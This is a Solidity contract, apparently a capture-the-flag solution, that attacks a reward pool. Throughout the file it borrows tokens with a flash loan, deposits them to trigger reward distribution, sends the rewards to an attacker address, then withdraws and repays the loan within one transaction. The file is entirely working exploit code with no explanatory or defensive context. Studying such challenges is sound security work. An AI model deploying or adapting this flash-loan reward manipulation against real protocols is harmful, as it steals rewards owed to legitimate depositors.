// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IFlashLoanerPool {
	function flashLoan(uint256) external;
}

interface ITheRewarderPool {
	function deposit(uint256) external;
	function withdraw(uint256) external;
	function distributeRewards() external returns (uint256);
}

contract TheRewarderHack {

	// IFlashLoanerPool public pool;
	ITheRewarderPool public immutable rewardPool;
	address public attacker;
	address public liqToken;
	address public rewardToken;
	address public loanPool;
	uint256 public loanAmount;
	constructor(address _loanPool, address _rewardPool, address _attacker, address _liqToken, address _rewardToken) {
		attacker = _attacker;
		liqToken = _liqToken;
		rewardToken = _rewardToken;
		loanPool = _loanPool;
		rewardPool = ITheRewarderPool(_rewardPool);
	}

	function hack(uint256 amount) public {
		IFlashLoanerPool(loanPool).flashLoan(amount);
	}

	function receiveFlashLoan(uint256 amount) public {
		IERC20(liqToken).approve(address(rewardPool), amount);
		rewardPool.deposit(amount);

		uint256 rewards = rewardPool.distributeRewards();
		IERC20(rewardToken).transfer(attacker, rewards);
		rewardPool.withdraw(amount);
		IERC20(liqToken).transfer(loanPool, amount);
	}


}